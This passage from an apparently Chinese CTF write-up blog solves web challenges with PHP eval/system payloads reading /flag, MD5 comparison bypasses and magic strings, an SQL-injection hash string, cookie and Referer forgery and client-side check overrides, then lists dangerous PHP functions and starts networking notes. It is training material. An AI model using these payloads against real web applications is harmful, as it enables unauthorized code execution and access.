punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    localStorage<span class="token punctuation">.</span>removeItem<span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>querySelector<span class="token punctuation">(</span><span class="token string">'input[type="submit"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但有个<code>alert</code>弹窗要点确定的我不知道怎么自动点， 还是手动点的</p><h2 id="8-16"><a href="#8-16" class="headerlink" title="#8.16"></a>#8.16</h2><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p><code>php</code>系统命令执行</p><ul><li><p><code>eval</code></p><p>注意分号，执行<code>eval</code>执行系统命令需要用<code>system</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "Hello, World!";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>shell_exec</code> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name type-declaration">php</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls -l'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>exec </code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">phpexec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls -l'</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token keyword">as</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>passthru </code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls -l'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>题目</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get</code>传参给<code>eval</code>执行，直接传<code>system(&#39;cat /flag&#39;);</code>，即<code>url?DT=system(&#39;cat /flag&#39;);</code></p><h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><p>看了篇md5绕过的文章：<a href="https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p><h4 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h4><p><code>md5($str1) == md5($str2)</code></p><p>原理：构造<code>MD5</code>值<code>0e</code>开头，弱类型比较是科学计数法,<code>0</code>的多少次方都是<code>0</code></p><p>单次<code>md5</code>后<code>0e</code>开头：<code>QNKCDZO、240610708、s878926199a、s155964671a、s214587387a</code></p><p>两次<code>md5</code>后<code>0e</code>开头：<code>CbDLytmyGm2xQyaLNhWn、770hQgrBOjrcqftrlaZk、7r4lGXCH2Ksu2JNT3BYM</code></p><h4 id="强类型"><a href="#强类型" class="headerlink" title="强类型"></a>强类型</h4><p><code>md5($str1) === md5($str2)</code></p><p>原理：<code>PHP</code>可以提交数组，<code>md5</code>或<code>sha1</code>传入数组返回值为<code>NULL</code></p><p>传入方式：<code>$_GET[&#39;name&#39;]-&gt;name[]=1</code></p><h4 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h4><p>使用<code>Fastcoll</code>：<a href="http://hduyyds.top/tools/fastcoll.rar">http://hduyyds.top/tools/fastcoll.rar</a></p><h4 id="绕过md5-来构造攻击语句"><a href="#绕过md5-来构造攻击语句" class="headerlink" title="绕过md5()来构造攻击语句"></a>绕过md5()来构造攻击语句</h4><p><code>ffifdyop</code>哈希后<code>ascii</code>字符串前几位是<code> or &#39;6</code>，拼接后变成<code>select * from ‘admin’ where password=’’ or ‘6xxxxx’</code>，永真</p><p>本题一次弱类型一次强类型，可以传入<code>get</code>参数：[<a href="http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2%5B%5C%5D=1%5D(http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2%5B%5D=1)%EF%BC%8C%60post%60%E5%8F%82%E6%95%B0%60password=s878926199a&amp;password2%5B%5D=2%60">http://challenge.basectf.fun:39853?name=QNKCDZO&amp;name2[\]=1](http://challenge.basectf.fun:39853/?name=QNKCDZO&amp;name2[]=1)，`post`参数`password=s878926199a&amp;password2[]=2`</a></p><h3 id="web七龙珠"><a href="#web七龙珠" class="headerlink" title="web七龙珠"></a>web七龙珠</h3><p>访问：<code>/flag1ab.html</code>，查看源码得到<code>flag1：bW9lY3Rm</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--></span><span class="token comment">&lt;!--flag1: bW9lY3Rm--></span><span class="token comment">&lt;!--下一步：/flag2hh.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问：<code>/flag2hh.php</code>，提示：本题关键词：<code>http</code>，想想服务器通过网络传输过来的，除了这个页面，还有什么？</p><p>抓包得到<code>flag2：e0FmdEV</code></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 16 Aug 2024 07:52:41 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.3.22</span></span><span class="token header"><span class="token header-name keyword">flag2</span><span class="token punctuation">:</span> <span class="token header-value">e0FmdEV</span></span><span class="token header"><span class="token header-name keyword">nextpage</span><span class="token punctuation">:</span> <span class="token header-value">/flag3cad.php</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">361</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>/flag3cad.php</code>，要求使用<code>admin</code>的身份验证，<code>bp</code>接收的响应中有<code>Set-Cookie</code>，改发送的<code>cookie</code>为<code>verify=admin</code>即可</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 16 Aug 2024 08:10:39 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.3.22</span></span><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=user</span></span><span class="token header"><span class="token header-name keyword">fxxk</span><span class="token punctuation">:</span> <span class="token header-value">/flag3.php</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">801</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送内容如下，最终得到<code>flag3: yX3RoMXN</code></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag3cad.php?a</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:52741</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="119", "Not?A_Brand";v="24"</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">none</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=admin</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">3</span></span>b=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问：<code>/flag4bbc.php</code>，提示啊？难道你不是从 <code>http://localhost:8080/flag3cad.php?a=1</code> 点击链接过来的吗？ 改<code>Referer</code>为该<code>url</code>进入游戏，<code>js</code>内容如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buttons <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> buttons<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  buttons<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"9"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getID</span><span class="token punctuation">(</span><span class="token parameter">button</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>button<span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你过关！（铜人震声）\n我们使用 console.log 来为你生成 flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'flag4bbc.php'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token string">'method=get'</span><span class="token punctuation">,</span>      <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>hint<span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>fll<span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>goto<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"该罚！(头部碰撞声)"</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接发送<code>post</code>请求<code>method=get</code>得到<code>flag4: fdFVUMHJ</code></p><p>访问：<code>/flag5sxr.php</code></p><p>提示要求输入<code>I want flag</code>，但是前端<code>js</code>判断</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"form"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>content <span class="token operator">==</span> <span class="token string">"I want flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你就这么直接？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在控制台直接重写<code>checkValue</code>函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再提交得到<code>flag5: fSV90aDF</code></p><p>访问<code>flag6diw.php</code>，提示</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag6diw.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag6: xxx"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>preg_match</code>函数是一个用于执行正则表达式匹配的函数，使用<code>preg_match</code>函数来检查<code>$_GET[&#39;moe&#39;]</code>参数是否包含字符串<code>flag</code>。正则表达式<code>/flag/</code>指定了一个简单的模式匹配，不区分大小写，可以简单改写大小写绕过</p><p>访问<code>url?moe=Flag</code>并且添加一个<code>post</code>参数得到<code>flag6: rZV9VX2t</code></p><p>访问<code>flag7fxxkfinal.php</code>，提示<code>eval($_POAT[&#39;what&#39;]);</code>，直接<code>post</code>参数<code>what=system(&#39;cat /flag7&#39;);</code>得到<code>rbm93X1dlQn0=</code></p><p>连起来就是<code>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code>，再<code>base64</code>解码即可</p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul><li><p><code>preg_match</code>用于执行正则表达式匹配的函数,在给定的字符串中搜索与正则表达式相匹配的内容，不区分大小写，可以改大小写绕过例如以下代码可以传入<code>?moe=/Flag/i</code>绕过</p></li><li><p><code>scandir(&quot;.&quot;)/glob</code> 列出当前目录中的所有文件和目录。</p></li><li><p><code>array_reverse()</code> 反转这个数组，使得最后添加的文件或目录变成数组的第一个元素。</p></li><li><p><code>next()</code> 移动数组的内部指针，因为 <code>array_reverse()</code> 后的第一个元素实际上是原数组的最后一个元素，<code>next()</code> 会返回原数组的倒数第二个文件或目录。</p></li><li><p><code>highlight_file()</code> 将对这个文件执行语法高亮并输出其源码。</p></li><li><p><code>include / require / include_once / require_once</code></p><p>这些函数用来包含并执行指定文件的<code>PHP</code>代码，如果文件路径是由用户输入控制的，攻击者可以包含一个远程文件（<code>Remote File Inclusion - RFI</code>），或者利用本地文件包含漏洞（<code>Local File Inclusion - LFI</code>）</p></li><li><p><code>unserialize</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializedStr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以将一个序列化的数组字符串转换为数组</p><p>反序列化一个字符串到<code>PHP</code>的值，不正确地处理用户提供的序列化数据可能导致对象注入攻击</p></li><li><p><code>preg_replace</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.*/e'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行一个正则表达式的搜索和替换，在<code>/e</code>修饰符存在的情况下，可以执行与<code>eval</code>函数类似的代码执行。</p></li><li><p><code>extract / parse_str</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这些函数将数组或字符串中的变量导入到当前符号表,可能被用来覆盖重要的变量值，改变程序流程</p></li><li><p><code>assert</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'strpos($_GET['</span><span class="token keyword">var</span><span class="token string single-quoted-string">'], "something") !== false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查一个断言是否为真，如果不为真则执行一个指定的代码，在某些配置下，<code>assert</code>可以被用来执行<code>PHP</code>代码</p></li><li><p><code>file_get_contents / fopen / readfile / file</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取文件内容或者从文件中读取数据,如果没有适当的限制，攻击者可以利用这些函数读取服务器上的敏感文件</p></li><li><p><code>file_get_contents()</code>: 读取文件的全部内容到一个字符串</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>file_put_contents()</code>: 将一个字符串写入文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>base64_encode() / base64_decode()</code> :对数据进行<code>Base64</code>编码和解码，常用于编码攻击载荷。</p></li><li><p><code>json_encode() / json_decode()</code>：<code>JSON</code>数据编码和解码，处理<code>AJAX</code>或<code>API</code>响应时常见</p></li><li><p><code>gzdeflate() / gzinflate()</code>：压缩和解压缩数据，有时用于绕过长度限制。</p></li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>救命两个月前才考的计网，放个假全忘了…还好我不考研（bushi</p><h4 id="计网前置知识"><a href="#计网前置知识" class="headerlink" title="计网前置知识"></a>计网前置知识</h4><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><ul><li>前缀：计算机所属物理网络，每个物理网络都有唯一网络号，根据网络号划分五类地址<ul><li>A类：<code>0.0.0.0~127.255.255.255</code></li><li>B类：<code>128.0.0.0~191.255.255.255</code></li><li>C类：<code>192.0.0.0~223.255.255.255</code></li><li>D类：<code>224.0.0.0~239.255.255.255</code></li><li>E类：<code>240.0.0.0~247.255.255.255</code></li><li>其中网络地址主机地址为<code>0</code>，广播地址网络号后所有位为<code>1</code>，回送地址（本地主机地址）<code>127.0.0.1</code>用于测试，<code>0.0.0.0</code>表示不特定的源地址，可以接受来自任何网络接口的连接请求</li></ul></li><li>后缀：确定该网络中的唯一一台计算机</li></ul><h5 id="OSI七层模型和TCP-x2F-IP协议结构层次"><a href="#OSI七层模型和TCP-x2F-IP协议结构层次" class="headerlink" title="OSI七层模型和TCP&#x2F;IP协议结构层次"></a>OSI七层模型和TCP&#x2F;IP协议结构层次</h5><table><thead><tr><th>OSI七层网络模型</th><th>TCP&#x2F;IP四层概念模型</th><th>对应网络协议</th></tr></thead><tbody><tr><td>应用层（Application）</td><td>应用层</td><td>HTTP、TFTP, FTP, NFS, WAIS、SMTP</td></tr><tr><td>表示层（Presentation）</td><td>应用层</td><td>Telnet, Rlogin, SNMP, Gopher</td></tr><tr><td>会话层（Session）</td><td>应用层</td><td>SMTP, DNS</td></tr><tr><td>传输层（Transport）</td><td>传输层</td><td>TCP, UDP</td></tr><tr><td>网络层（Network）</td><td>网络层</td><td>IP, ICMP, ARP, RARP, AKP, UUCP</td></tr><tr><td>数据链路层（Data Link）</td><td>数据链路层</td><td>FDDI, Ethernet, Arpanet, PDN, SLIP, PPP</td></tr><tr><td>物理层（Physical）</td><td>数据链路层</td><td>IEEE 802.1A, IEEE 802.2到IEEE 802.11</td></tr></tbody></table><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><p>用于标识通信的应用程序，将进程与端口绑定，范围在<code>0~65535</code>，<code>0~256</code>是系统保留端口，其余为自由端口</p><h4 id="套接字编程"><a href="#套接字编程" class="headerlink" 